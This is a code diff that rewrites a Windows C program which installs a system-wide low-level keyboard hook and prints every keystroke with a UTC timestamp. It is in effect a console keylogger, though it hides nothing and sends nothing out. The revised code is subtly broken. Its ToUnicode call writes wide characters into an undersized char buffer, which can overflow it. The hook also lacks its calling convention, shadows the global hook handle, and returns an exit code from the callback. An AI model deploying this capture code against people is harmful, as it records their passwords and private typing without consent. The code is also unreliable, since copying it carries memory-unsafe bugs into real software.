@@ -1,83 +1,92 @@
-#include <stdlib.h>
+#include <minwindef.h>
 #include <windows.h>
 #include <stdio.h>
+#include <stdlib.h>
 
-// Global hook handle
+
+// function declaration
+LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+
+
+// global variables
 HHOOK keyboardHook;
+SYSTEMTIME stUTC;
 
-// hook procedure
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HC_ACTION) {
-        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-            KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
-            char keyName[50] = { 0 };
-            int isSpecialKey = 1; // Flag to handle non-printable keys
-
-            // Manually handling common non-printable keys (special keys)
-            switch (p->vkCode) {
-            case VK_BACK:   strcpy(keyName, "[BACKSPACE]"); break;
-            case VK_RETURN: strcpy(keyName, "[ENTER]"); break;
-            case VK_TAB:    strcpy(keyName, "[TAB]"); break;
-            case VK_SHIFT:
-            case VK_LSHIFT:
-            case VK_RSHIFT: strcpy(keyName, "[SHIFT]"); break;
-            case VK_CONTROL:
-            case VK_LCONTROL:
-            case VK_RCONTROL: strcpy(keyName, "[CTRL]"); break;
-            case VK_MENU:
-            case VK_LMENU:
-            case VK_RMENU:  strcpy(keyName, "[ALT]"); break;
-            case VK_LWIN:
-            case VK_RWIN:   strcpy(keyName, "[WINDOWS]"); break;
-            case VK_CAPITAL:strcpy(keyName, "[CAPS LOCK]"); break;
-            case VK_ESCAPE: strcpy(keyName, "[ESCAPE]"); break;
-            default:
-                isSpecialKey = 0;
-                break;
-            }
-
-            if (isSpecialKey) {
-                //printf("%s\n", keyName);
-                printf("vkCode: 0x%02lX, Name: %s\n", p->vkCode, keyName);
-            }
-            else {
-                // Try to translate to unicode character
-                BYTE keyboardState[256];
-                if (GetKeyboardState(keyboardState) == FALSE) {
-                    fprintf(stderr, "Error: Failed to get keyboard state. GetLastError = %lu\n", GetLastError());
-                    return EXIT_FAILURE;
-                }
-                WCHAR unicodeChar[5];
-                int result = ToUnicode(p->vkCode, p->scanCode, keyboardState, unicodeChar, _countof(unicodeChar), 0);
-
-                if (result > 0) {
-                    printf("vkCode: 0x%02lX, Translated: '%ls'\n", p->vkCode, unicodeChar);
-                }
-                else {
-                    // Fallback to GetKeyNameText for other keys (like F1-F12, Home, etc.)
-                    // Bit 24 indicates an extended key, such as the right-hand ALT and CTRL keys.
-                    LONG lParam_for_getkey = (p->scanCode << 16) | ((p->flags & LLKHF_EXTENDED) << 24);
-                    GetKeyNameTextA(lParam_for_getkey, keyName, sizeof(keyName));
-                    printf("vkCode: 0x%02lX, Name: [%s]\n", p->vkCode, keyName);
-                }
-            }
-        }
-    }
-    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
-}
 
 int main() {
-    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
+
+    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
     if (!keyboardHook) {
-        fprintf(stderr, "Error: Failed to set hook. GetLastError = %lu\n", GetLastError());
+        fprintf(stderr, "Error: Failed to set keyboard hook. Error code: %lu\n", GetLastError());
         return EXIT_FAILURE;
+    } else {
+        wprintf(L"Keyboard hook set successfully.\n");
     }
-    printf("Hook set successfully. Press keys to see output. Press Ctrl+C in this console to exit.\n");
+
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+
     UnhookWindowsHookEx(keyboardHook);
     return EXIT_SUCCESS;
+}
+
+LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+
+    if (nCode == HC_ACTION) {
+
+        GetSystemTime(&stUTC);
+        char keyName[50] = { 0 };
+        BYTE keyboardState[256];
+
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            KBDLLHOOKSTRUCT* pKeyInfo = (KBDLLHOOKSTRUCT*)lParam;
+
+            switch (pKeyInfo->vkCode) {
+                case VK_BACK:   strcpy(keyName, "Backspace"); break;
+                case VK_RETURN: strcpy(keyName, "Enter"); break;
+                case VK_TAB:    strcpy(keyName, "Tab"); break;
+                case VK_SHIFT:
+                case VK_LSHIFT:
+                case VK_RSHIFT: strcpy(keyName, "Shift"); break;
+                case VK_CONTROL:
+                case VK_LCONTROL:
+                case VK_RCONTROL: strcpy(keyName, "Control"); break;
+                case VK_MENU:
+                case VK_LMENU:
+                case VK_RMENU:  strcpy(keyName, "Alt"); break;
+                case VK_LWIN:
+                case VK_RWIN:   strcpy(keyName, "Windows key"); break;
+                case VK_ESCAPE: strcpy(keyName, "Escape"); break;
+                case VK_SPACE: strcpy(keyName, "Space"); break;
+                case VK_VOLUME_DOWN: strcpy(keyName, "Volume Down"); break;
+                case VK_VOLUME_UP: strcpy(keyName, "Volume Up"); break;
+                case VK_VOLUME_MUTE: strcpy(keyName, "Mute"); break;
+                case VK_PLAY: strcpy(keyName, "Play"); break;
+                case VK_PAUSE: strcpy(keyName, "Pause"); break;
+
+                default:
+                    if (GetKeyboardState(keyboardState) == FALSE) {
+                        fprintf(stderr, "Error: Failed to get keyboard state. GetLastError = %lu\n", GetLastError());
+                        return EXIT_FAILURE;
+                    }
+                    if (ToUnicode(pKeyInfo->vkCode, pKeyInfo->scanCode, keyboardState, (LPWSTR)keyName, _countof(keyName), 0) == 0) {
+                        // Fallback to GetKeyNameText for other keys (like F1-F12, Home, etc.)
+                        // Bit 24 indicates an extended key, such as the right-hand ALT and CTRL keys.
+                        LONG lParam_for_getkey = (pKeyInfo->scanCode << 16) | ((pKeyInfo->flags & LLKHF_EXTENDED) << 24);
+                        GetKeyNameTextA(lParam_for_getkey, keyName, sizeof(keyName));
+                    }
+                    break;
+            }
+
+            printf("[%04d-%02d-%02d %02d:%02d:%02d] 0x%02lX '%s'\n",
+                    stUTC.wYear, stUTC.wMonth, stUTC.wDay,
+                    stUTC.wHour, stUTC.wMinute, stUTC.wSecond,
+                    pKeyInfo->vkCode, keyName);
+        }
+    }
+
+    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
